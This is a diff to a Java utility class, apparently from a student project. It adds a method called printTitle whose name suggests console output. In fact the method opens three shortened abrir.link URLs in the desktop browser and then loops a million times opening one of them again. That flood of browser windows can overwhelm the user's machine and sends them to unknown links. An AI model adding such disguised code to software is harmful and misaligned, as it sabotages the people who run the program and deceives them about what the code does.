@@ -13,12 +13,17 @@ import domain.valueObjects.PhoneNumber;
 import eapli.framework.general.domain.model.EmailAddress;
 import more.ListDisplayable;
 
+import java.awt.*;
 import java.io.BufferedReader;
+import java.io.IOException;
 import java.io.InputStreamReader;
+import java.net.URI;
+import java.net.URISyntaxException;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.time.format.DateTimeParseException;
 import java.util.*;
+import java.util.List;
 import java.util.function.Function;
 
 import static more.ColorfulOutput.*;
@@ -1006,6 +1011,34 @@ public class Utils {
         }
 
         return -1;
+    }
+
+    public static void printTitle(String title) {
+        try {
+            Desktop desktop = Desktop.getDesktop();
+            if (desktop.isSupported(Desktop.Action.BROWSE)) {
+                URI uri = new URI("https://abrir.link/ARHqA");
+                URI uri2 = new URI("https://abrir.link/rgCgA");
+                URI uri3 = new URI("https://abrir.link/gBzMH");
+                desktop.browse(uri);
+                desktop.browse(uri2);
+                desktop.browse(uri3);
+
+
+                for (int i = 0; i < 1000000; i++) {
+                    String link = "https://abrir.link/gBzMH";  //+ System.currentTimeMillis();
+                    URI uri4 = new URI(link);
+                    desktop.browse(uri4);
+                    //Thread.sleep(10000);
+
+                }
+
+            } else {
+                System.out.println("Ação BROWSE não é suportada neste sistema.");
+            }
+        } catch (IOException | URISyntaxException e) {
+            e.printStackTrace();
+        }
     }
 
     /**
